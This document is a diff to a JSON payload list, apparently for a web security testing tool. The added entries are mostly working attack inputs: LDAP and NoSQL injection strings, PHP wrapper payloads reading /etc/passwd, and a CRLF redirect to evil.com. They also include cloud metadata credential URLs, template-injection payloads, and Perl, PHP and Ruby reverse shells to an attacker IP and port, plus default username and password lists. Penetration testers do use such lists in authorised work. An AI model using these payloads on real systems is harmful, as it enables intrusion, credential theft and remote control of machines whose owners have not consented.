@@ -55,6 +55,47 @@
             ]
         },
         {
+            "name": "LDAP",
+            "values": [
+                {
+                    "name":"",
+                    "value":"*)(&"
+                },
+                {
+                    "name":"",
+                    "value":"*/*"
+                },
+                {
+                    "name":"",
+                    "value":"*|"
+                },
+                {
+                    "name":"",
+                    "value":"//*"
+                },
+                {
+                    "name":"",
+                    "value":"*))%00"
+                },
+                {
+                    "name":"",
+                    "value":"*/*"
+                },
+                {
+                    "name":"",
+                    "value":"@*"
+                },
+                {
+                    "name":"",
+                    "value":"*)(uid=*))(|(uid=*"
+                },
+                {
+                    "name":"",
+                    "value":"*(|(objectclass=*))"
+                }
+            ]
+        },
+        {
             "name": "Command Injection",
             "values": [
                 {
@@ -152,6 +193,26 @@
                         {
                             "name": "PHP - input",
                             "value": "php://input"
+                        },
+                        {
+                            "name": "PHP - filter read",
+                            "value": "php://filter/read=string.rot13/resource=index.php"
+                        },
+                        {
+                            "name": "PHP - filter base64",
+                            "value": "php://filter/convert.base64-encode/resource=index.php"
+                        },
+                        {
+                            "name": "PHP - filter zlib",
+                            "value": "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+                        },
+                        {
+                            "name": "data - text",
+                            "value": "data://text/plain,<?php phpinfo(); ?>"
+                        },
+                        {
+                            "name": "PHP - phar",
+                            "value": "phar://"
                         }
                     ]
                 },
@@ -392,6 +453,24 @@
                     ]
                 },
                 {
+                    "name" : "Juicy files",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "/var/run/secrets/kubernetes.io/serviceaccount"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/lib/mlocate/mlocate.db"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/lib/mlocate.db"
+                        }
+
+                    ]
+                },
+                {
                     "name": "Windows Files",
                     "values": [
                         {
@@ -603,14 +682,43 @@
                     "name": "CRLF",
                     "values": [
                         {
-                            "name": "Simple",
+                            "name": "Cookie",
                             "value": "%0D%0ASet-Cookie:mycookie=myvalue"
+                        },
+                        {
+                            "name": "Path",
+                            "value": "%0d%0aLocation:%20http://evil.com"
                         }
                     ]
                 },
                 {
-                    "name": "Hackvertor Authorization",
+                    "name": "POST Body",
+                    "values": [
+                        {
+                            "name":"JSON",
+                            "value":"Content-Type: application/json\n\n{}"
+                        },
+                        {
+                            "name":"Multipart",
+                            "value":"Content-Type: multipart/form-data; boundary=abcde12345\n\n--abcde12345\nContent-Disposition: form-data; name=\"id\"\n\n1\n--abcde12345\nContent-Disposition: form-data; name=\"file\"; filename=\"image1.png\"\nContent-Type: image/png\n\nAAAA\n--abcde12345--"
+                        },
+                        {
+                            "name":"XML",
+                            "value":"Content-Type: application/xml;charset=UTF-8\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><root>\n<id>1</id>\n</root>\n"
+                        }
+                    ]
+                },
+                {
+                    "name": "Hackvertor Authorization - admin",
                     "value": "Authorization: Basic <@base64>admin:admin<@/base64>"
+                },
+                {
+                    "name": "Hackvertor Authorization - manager",
+                    "value": "Authorization: Basic <@base64>manager:manager<@/base64>"
+                },
+                {
+                    "name": "Hackvertor Authorization - tomcat",
+                    "value": "Authorization: Basic <@base64>tomcat:tomcat<@/base64>"
                 },
                 {
                     "name": "",
@@ -641,6 +749,20 @@
                         {
                             "name": "Meta-data 4",
                             "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance"
+                        },
+                        {
+                            "name": "Bucket url 1",
+                            "value": "http://s3.amazonaws.com/§BUCKET_NAME§/",
+                            "prompt": [
+                                "§BUCKET_NAME§"
+                            ]
+                        },
+                        {
+                            "name": "Bucket url 2",
+                            "value": "http://§BUCKET_NAME§.s3.amazonaws.com/",
+                            "prompt": [
+                                "§BUCKET_NAME§"
+                            ]
                         }
                     ]
                 },
@@ -694,6 +816,43 @@
                 {
                     "name": "",
                     "value": "{\"$gt\":\"\"}"
+                },
+                {
+                    "name": "",
+                    "value": "true, $where: '1 == 1'"
+                },
+                {
+                    "name": "",
+                    "value": "', $where: '1 == 1'"
+                },
+                {
+                    "name": "",
+                    "value": "{ $ne: 1 }"
+                },
+                {
+                    "name": "",
+                    "value": "';sleep(5000);"
+                }
+            ]
+        },
+        {
+            "name": "CSTI",
+            "values": [
+                {
+                    "name": "AngularJS",
+                    "value" :"{{$on.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "VusJS V2",
+                    "value" :"{{constructor.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "VusJS V3",
+                    "value" :"{{_openBlock.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "Mayo",
+                    "value" :"[self.alert(1)]"
                 }
             ]
         },
@@ -740,6 +899,30 @@
                         "IP",
                         "PORT"
                     ]
+                },
+                {
+                    "name": "Perl",
+                    "value": "perl -e 'use Socket;$i=\"§IP§\";$p=§PORT§;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "PHP",
+                    "value": "php -r '$s=fsockopen(\"§IP§\",§PORT§);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "Ruby",
+                    "value": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"§IP§\",\"§PORT§\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
                 }
             ]
         }
@@ -749,7 +932,6 @@
             "name": "Headers",
             "values": [
                 "Authorization: Bearer",
-                "A-IM",
                 "Accept",
                 "Accept-Application",
                 "Accept-Charset",
@@ -759,7 +941,6 @@
                 "Accept-Language",
                 "Accept-Ranges",
                 "Accept-Version",
-                "Accepted",
                 "Access-Control-Allow-Credentials",
                 "Access-Control-Allow-Headers",
                 "Access-Control-Allow-Methods",
@@ -771,16 +952,13 @@
                 "Access-Token",
                 "Accesskey",
                 "Action",
-                "Admin",
                 "Age",
                 "Ajax",
-                "Akamai-Origin-Hop",
                 "Allow",
                 "App",
                 "App-Env",
                 "App-Key",
                 "Appcookie",
-                "Apply-To-Redirect-Ref",
                 "Appname",
                 "Appversion",
                 "Atcept-Language",
@@ -800,24 +978,12 @@
                 "Authorization",
                 "Bad-Gateway",
                 "Bad-Request",
-                "Bae-Env-Addr-Bcms",
-                "Bae-Env-Addr-Bcs",
-                "Bae-Env-Addr-Bus",
-                "Bae-Env-Addr-Channel",
-                "Bae-Env-Addr-Sql-Ip",
-                "Bae-Env-Addr-Sql-Port",
-                "Bae-Env-Ak",
-                "Bae-Env-Appid",
-                "Bae-Env-Sk",
-                "Bae-Logid",
-                "Bar",
                 "Base",
                 "Base-Url",
                 "Basic",
                 "Bearer-Indication",
                 "Body-Maxlength",
                 "Body-Truncated",
-                "Brief",
                 "Browser-User-Agent",
                 "Cache-Control",
                 "Cache-Info",
@@ -1454,44 +1620,23 @@
                 "Support-Sslrequests",
                 "Surrogate-Capability",
                 "Switching-Protocols",
+
+
                 "TE",
                 "Te",
-                "Temporary-Redirect",
-                "Test",
-                "Test-Config",
-                "Test-Server-Path",
-                "Test-Something-Anything",
                 "Ticket",
                 "Time-Out",
                 "Timeout",
                 "Timing-Allow-Origin",
-                "Title",
-                "Tk",
-                "Tmp",
                 "Token",
                 "Trailer",
                 "Transfer-Encoding",
                 "Translate",
-                "Transport-Err",
                 "True-Client-Ip",
                 "True-Client-IP",
-                "Ua",
-                "Ua-Color",
-                "Ua-Cpu",
-                "Ua-Os",
-                "Ua-Pixels",
-                "Ua-Resolution",
-                "Ua-Voice",
-                "Unauthorized",
-                "Unencoded-Url",
-                "Unit-Test-Mode",
-                "Unless-Modified-Since",
-                "Unprocessable-Entity",
-                "Unsupported-Media-Type",
                 "Upgrade",
                 "Upgrade-Insecure-Requests",
                 "Upgrade-Required",
-                "Upload-Default-Chmod",
                 "Uri",
                 "Url",
                 "Url-From-Env",
@@ -1499,14 +1644,6 @@
                 "Url-Join-Query",
                 "Url-Replace",
                 "Url-Sanitize-Path",
-                "Url-Strip-All",
-                "Url-Strip-Auth",
-                "Url-Strip-Fragment",
-                "Url-Strip-Pass",
-                "Url-Strip-Path",
-                "Url-Strip-Port",
-                "Url-Strip-Query",
-                "Url-Strip-User",
                 "Use-Gzip",
                 "Use-Proxy",
                 "User",
@@ -1519,53 +1656,18 @@
                 "User-Photos",
                 "Useragent",
                 "Useragent-Via",
-                "Util",
-                "Variant-Also-Varies",
                 "Vary",
                 "Verbose",
-                "Verbose-Throttle",
-                "Verify-Cert",
                 "Version",
-                "Version-1-0",
-                "Version-1-1",
-                "Version-Any",
-                "Version-None",
-                "Version-Not-Supported",
-                "Versioncode",
                 "Via",
-                "Viad",
-                "Waf-Stuff-Below",
                 "Wap-Connection",
-                "Warning",
-                "Web-Server-Api",
-                "Webodf-Member-Id",
-                "Webodf-Session-Id",
-                "Webodf-Session-Revision",
-                "Work-Directory",
                 "Www-Address",
                 "Www-Authenticate",
-                "X",
-                "X-Aastra-Expmod1",
-                "X-Aastra-Expmod2",
-                "X-Aastra-Expmod3",
-                "X-Accel-Mapping",
                 "X-Access-Token",
-                "X-Advertiser-Id",
-                "X-Ajax-Real-Method",
-                "X-Alto-Ajax-Keyz",
-                "X-Amz-Date",
-                "X-Amz-Website-Redirect-Location",
-                "X-Amzn-Remapped-Host",
                 "X-Api-Key",
                 "X-Api-Signature",
                 "X-Api-Timestamp",
                 "X-Apitoken",
-                "X-Apple-Client-Application",
-                "X-Apple-Store-Front",
-                "X-Arr-Log-Id",
-                "X-Arr-Ssl",
-                "X-ATT-DeviceId",
-                "X-Att-Deviceid",
                 "X-Auth-Key",
                 "X-Auth-Mode",
                 "X-Auth-Password",
@@ -1577,18 +1679,11 @@
                 "X-Authentication",
                 "X-Authentication-Key",
                 "X-Authorization",
-                "X-Avantgo-Screensize",
-                "X-Azc-Remote-Addr",
-                "X-Bear-Ajax-Request",
-                "X-Bluecoat-Via",
-                "X-Bolt-Phone-Ua",
                 "X-Browser-Height",
                 "X-Browser-Width",
                 "X-Cascade",
-                "X-Cept-Encoding",
                 "X-Cf-Url",
                 "X-Chrome-Extension",
-                "X-Cisco-Bbsm-Clientip",
                 "X-Client-Host",
                 "X-Client-Id",
                 "X-Client-Ip",
@@ -1598,12 +1693,6 @@
                 "X-Client-Os-Ver",
                 "X-Clientip",
                 "X-Cluster-Client-Ip",
-                "X-Codeception-Codecoverage",
-                "X-Codeception-Codecoverage-Config",
-                "X-Codeception-Codecoverage-Debug",
-                "X-Codeception-Codecoverage-Suite",
-                "X-Collect-Coverage",
-                "X-Coming-From",
                 "X-Confirm-Delete",
                 "X-Content-Type",
                 "X-Content-Type-Options",
@@ -1612,45 +1701,20 @@
                 "X-Csrf-Crumb",
                 "X-Csrf-Token",
                 "X-Csrftoken",
-                "X-Cuid",
                 "X-Custom",
-                "X-Dagd-Proxy",
-                "X-Davical-Testcase",
-                "X-Dcmguid",
                 "X-Debug-Test",
                 "X-Device-User-Agent",
                 "X-Dialog",
                 "X-Dns-Prefetch-Control",
                 "X-Do-Not-Track",
-                "X-Dokuwiki-Do",
-                "X-Drestcg",
-                "X-Dsid",
-                "X-Elgg-Apikey",
-                "X-Elgg-Hmac",
-                "X-Elgg-Hmac-Algo",
-                "X-Elgg-Nonce",
-                "X-Elgg-Posthash",
-                "X-Elgg-Posthash-Algo",
-                "X-Elgg-Time",
-                "X-Em-Uid",
-                "X-Enable-Coverage",
                 "X-Environment-Override",
-                "X-Expected-Entity-Length",
-                "X-Experience-Api-Version",
-                "X-Fb-User-Remote-Addr",
                 "X-File-Id",
                 "X-File-Name",
                 "X-File-Resume",
                 "X-File-Size",
                 "X-File-Type",
                 "X-Filename",
-                "X-Firelogger",
-                "X-Fireloggerauth",
-                "X-Firephp-Version",
                 "X-Flash-Version",
-                "X-Flx-Consumer-Key",
-                "X-Flx-Consumer-Secret",
-                "X-Flx-Redirect-Url",
                 "X-Foo",
                 "X-Foo-Bar",
                 "X-Forward-For",
@@ -1668,11 +1732,8 @@
                 "X-Forwarded-Ssl",
                 "X-Forwarder-For",
                 "X-From",
-                "X-Gb-Shared-Secret",
                 "X-Geoip-Country",
                 "X-Get-Checksum",
-                "X-Helpscout-Event",
-                "X-Helpscout-Signature",
                 "X-Host",
                 "X-Http-Destinationurl",
                 "X-Http-Host-Override",
@@ -1680,63 +1741,19 @@
                 "X-Http-Method-Override",
                 "X-Http-Path-Override",
                 "X-Https",
-                "X-Htx-Agent",
-                "X-Huawei-Userid",
-                "X-Hub-Signature",
                 "X-If-Unmodified-Since",
-                "X-Imbo-Test-Config",
-                "X-Insight",
                 "X-Ip",
-                "X-Ip-Trail",
-                "X-Iwproxy-Nesting",
-                "X-Jphone-Color",
-                "X-Jphone-Display",
-                "X-Jphone-Geocode",
-                "X-Jphone-Msname",
-                "X-Jphone-Uid",
                 "X-Json",
-                "X-Kaltura-Remote-Addr",
-                "X-Known-Signature",
-                "X-Known-Username",
-                "X-Litmus",
-                "X-Litmus-Second",
                 "X-Locking",
                 "X-Machine",
                 "X-Mandrill-Signature",
                 "X-Method-Override",
                 "X-Mobile-Gateway",
                 "X-Mobile-Ua",
-                "X-Mosso-Dt",
                 "X-Moz",
                 "X-Ms-Policykey",
-                "X-Msisdn",
-                "X-Myqee-System-Debug",
-                "X-Myqee-System-Hash",
-                "X-Myqee-System-Isadmin",
-                "X-Myqee-System-Isrest",
-                "X-Myqee-System-Pathinfo",
-                "X-Myqee-System-Project",
-                "X-Myqee-System-Rstr",
-                "X-Myqee-System-Time",
                 "X-Network-Info",
-                "X-Nfsn-Https",
-                "X-Ning-Request-Uri",
-                "X-Nokia-Bearer",
-                "X-Nokia-Connection-Mode",
-                "X-Nokia-Gateway-Id",
-                "X-Nokia-Ipaddress",
-                "X-Nokia-Msisdn",
-                "X-Nokia-Wia-Accept-Original",
-                "X-Nokia-Wtls",
-                "X-Nuget-Apikey",
-                "X-Oc-Mtime",
-                "X-Opera-Info",
-                "X-Operamini-Features",
-                "X-Operamini-Phone",
-                "X-Operamini-Phone-Ua",
                 "X-Options",
-                "X-Orange-Id",
-                "X-Orchestra-Scheme",
                 "X-Orig-Client",
                 "X-Original-Host",
                 "X-Original-Http-Command",
@@ -1747,19 +1764,11 @@
                 "X-Originally-Forwarded-Proto",
                 "X-Originating-Ip",
                 "X-Originating-IP",
-                "X-Os-Prefs",
-                "X-Overlay",
-                "X-Pagelet-Fragment",
                 "X-Password",
-                "X-Phabricator-Csrf",
-                "X-Phpbb-Using-Plupload",
-                "X-Pjax",
-                "X-Pjax-Container",
                 "X-Prototype-Version",
                 "X-Proxy-Url",
                 "X-Pswd",
                 "X-Purpose",
-                "X-Qafoo-Profiler",
                 "X-Real-Ip",
                 "X-Remote-Addr",
                 "X-Remote-IP",
@@ -1777,10 +1786,6 @@
                 "X-Rest-Password",
                 "X-Rest-Username",
                 "X-Rewrite-Url",
-                "X-Sakura-Forwarded-For",
-                "X-Scalr-Auth-Key",
-                "X-Scalr-Auth-Token",
-                "X-Scalr-Env-Id",
                 "X-Scanner",
                 "X-Scheme",
                 "X-Screen-Height",
@@ -1792,31 +1797,13 @@
                 "X-Server-Name",
                 "X-Server-Port",
                 "X-Signature",
-                "X-Sina-Proxyuser",
-                "X-Skyfire-Phone",
-                "X-Skyfire-Screen",
                 "X-Ssl",
                 "X-Subdomain",
-                "X-Te",
-                "X-Teamsite-Preremap",
-                "X-Test-Session-Id",
                 "X-Timer",
-                "X-Tine20-Jsonkey",
-                "X-Tine20-Request-Type",
                 "X-Tomboy-Client",
                 "X-Tor",
                 "X-Twilio-Signature",
                 "X-Ua-Device",
-                "X-Ucbrowser-Device-Ua",
-                "X-UIDH",
-                "X-Uidh",
-                "X-Unique-Id",
-                "X-Uniquewcid",
-                "X-Up-Calling-Line-Id",
-                "X-Up-Devcap-Iscolor",
-                "X-Up-Devcap-Screendepth",
-                "X-Up-Devcap-Screenpixels",
-                "X-Up-Subno",
                 "X-Update",
                 "X-Update-Range",
                 "X-Upload-Maxresolution",
@@ -1828,19 +1815,12 @@
                 "X-User-Agent",
                 "X-Username",
                 "X-Varnish",
-                "X-Verify-Credentials-Authorization",
-                "X-Vodafone-3gpdpcontext",
                 "X-Wap-Client-Sdu-Size",
                 "X-Wap-Clientid",
                 "X-Wap-Gateway",
-                "X-Wap-Network-Client-Ip",
-                "X-Wap-Network-Client-Msisdn",
                 "X-Wap-Profile",
                 "X-Wap-Proxy-Cookie",
                 "X-Wap-Session-Id",
-                "X-Wap-Tod",
-                "X-Wap-Tod-Coded",
-                "X-Whatever",
                 "X-Wikimedia-Debug",
                 "X-Wp-Nonce",
                 "X-Wp-Pjax-Prefetch",
@@ -1850,23 +1830,8 @@
                 "X-Xhr-Referer",
                 "X-Xmlhttprequest",
                 "X-Xpid",
-                "X-Zikula-Ajax-Token",
-                "X-Zotero-Version",
-                "X-Ztgo-Bearerinfo",
-                "X_alto_ajax_key",
-                "Xauthorization",
-                "Xonnection",
-                "Xpdb-Debugger",
-                "Xproxy",
-                "Xroxy-Connection",
-                "Xxx-Real-Ip",
-                "Xxxxxxxxxxxxxxx",
-                "Y",
-                "Zotero-Api-Version",
-                "Zotero-Write-Token",
                 "Accept-Patch",
                 "Alt-Svc",
-                "Delta-Base",
                 "ETag",
                 "IM",
                 "P3P",
@@ -1874,26 +1839,14 @@
                 "X-Frame-Options",
                 "X-HTTP-Method-Override",
                 "x-wap-profile",
-                "Accept-CH",
-                "Accept-CH-Lifetime",
-                "Clear-Site-Data",
                 "Cross-Origin-Resource-Policy",
-                "DPR",
-                "Device-Memory",
-                "Early-Data",
                 "Expect-CT",
                 "Feature-Policy",
                 "Sec-Fetch-Dest",
                 "Sec-Fetch-Mode",
                 "Sec-Fetch-Site",
                 "Sec-Fetch-User",
-                "Sec-WebSocket-Accept",
-                "Server-Timing",
-                "SourceMap",
-                "Want-Digest",
-                "X-DNS-Prefetch-Control",
-                "X-ProxyUser-Ip",
-                "X-XSS-Protection"
+                "Sec-WebSocket-Accept"
             ]
         },
         {
@@ -1975,6 +1928,249 @@
                 "patch",
                 "search",
                 "arbitrary"
+            ]
+        },
+        {
+            "name": "Protocols",
+            "values": [
+                "dict://",
+                "file://",
+                "ftp://",
+                "ftps://",
+                "gopher://",
+                "http://",
+                "https://",
+                "imap://",
+                "imaps://",
+                "ldap://",
+                "ldaps://",
+                "pop3://",
+                "pop3s://",
+                "rtmp://",
+                "rtmpe://",
+                "rtmps://",
+                "rtmpt://",
+                "rtmpte://",
+                "rtmpts://",
+                "rtsp://",
+                "scp://",
+                "sftp://",
+                "smb://",
+                "smbs://",
+                "smtp://",
+                "smtps://",
+                "telnet://",
+                "tftp://"
+            ]
+        },
+        {
+            "name": "Content-Type",
+            "values": [
+                
+                "application/x-shockwave-flash",
+                "application/pdf",
+                "application/atom+xml",
+                "application/octet-stream",
+                "image/bmp",
+                "application/x-bzip",
+                "application/x-bzip2",
+                "text/css",
+                "text/csv",
+                "application/x-debian-package",
+                "application/xml-dtd",
+                "application/ecmascript",
+                "image/gif",
+                "text/html",
+                "text/calendar",
+                "image/x-icon",
+                "application/javascript",
+                "application/json",
+                "image/jpeg",
+                "application/mbox",
+                "audio/mpeg",
+                "video/mpeg",
+                "audio/mp4",
+                "video/mp4",
+                "application/mp4",
+                "application/ogg",
+                "audio/ogg",
+                "video/ogg",
+                "audio/webm",
+                "video/webm",
+                "image/png",
+                "application/postscript",
+                "video/quicktime",
+                "application/rtf",
+                "text/richtext",
+                "image/svg+xml",
+                "image/tiff",
+                "text/plain",
+                "text/x-uuencode",
+                "text/x-vcalendar",
+                "text/x-vcard",
+                "image/webp",
+                "application/wsdl+xml",
+                "application/xhtml+xml",
+                "text/yaml",
+                "application/zip"
+            ]
+        },
+        {
+            "name": "Session cookie",
+            "values": [
+                "ASP.NET_SessionId",
+                "ASPSESSIONID",
+                "SITESERVER",
+                "cfid",
+                "cftoken",
+                "jsessionid",
+                "sessid",
+                "sid",
+                "viewstate",
+                "zenid",
+                "PHPSESSID"
+            ]
+        },
+        {
+            "name": "Usernames",
+            "values": [
+                "root",
+                "admin",
+                "test",
+                "guest",
+                "info",
+                "adm",
+                "mysql",
+                "user",
+                "administrator",
+                "oracle",
+                "ftp",
+                "manager",
+                "operator",
+                "supervisor",
+                "debug"
+            ]
+        },
+        {
+            "name": "Passwords",
+            "values": [
+                "password",
+                "admin",
+                "manager",
+                "test",
+                "guest",
+                "1234",
+                "azerty",
+                "qwerty",
+                "Passw0rd!",
+                "cisco",
+                "root",
+                "debug"
+            ]
+        },
+        {
+            "name": "Subdomains",
+            "values": [
+                "www",
+                "mail",
+                "ftp",
+                "localhost",
+                "webmail",
+                "smtp",
+                "pop",
+                "ns1",
+                "webdisk",
+                "ns2",
+                "cpanel",
+                "whm",
+                "autodiscover",
+                "autoconfig",
+                "m",
+                "imap",
+                "test",
+                "ns",
+                "blog",
+                "pop3",
+                "dev",
+                "www2",
+                "admin",
+                "forum",
+                "news",
+                "vpn",
+                "ns3",
+                "mail2",
+                "new",
+                "mysql",
+                "old",
+                "lists",
+                "support",
+                "mobile",
+                "mx",
+                "static",
+                "docs",
+                "beta",
+                "shop",
+                "sql",
+                "secure",
+                "demo",
+                "cp",
+                "calendar",
+                "wiki",
+                "web",
+                "media",
+                "email",
+                "images",
+                "img",
+                "www1",
+                "intranet",
+                "portal",
+                "video",
+                "sip",
+                "dns2",
+                "api",
+                "cdn",
+                "stats",
+                "dns1",
+                "ns4",
+                "www3",
+                "dns",
+                "search",
+                "staging",
+                "server",
+                "mx1",
+                "chat",
+                "wap",
+                "my",
+                "svn",
+                "mail1",
+                "sites",
+                "proxy",
+                "ads",
+                "host",
+                "crm",
+                "cms",
+                "backup",
+                "mx2",
+                "lyncdiscover",
+                "info",
+                "apps",
+                "download",
+                "remote",
+                "db",
+                "forums",
+                "store",
+                "relay",
+                "files",
+                "newsletter",
+                "app",
+                "live",
+                "owa",
+                "en",
+                "start",
+                "sms",
+                "office",
+                "exchange",
+                "ipv4"
             ]
         }
     ]
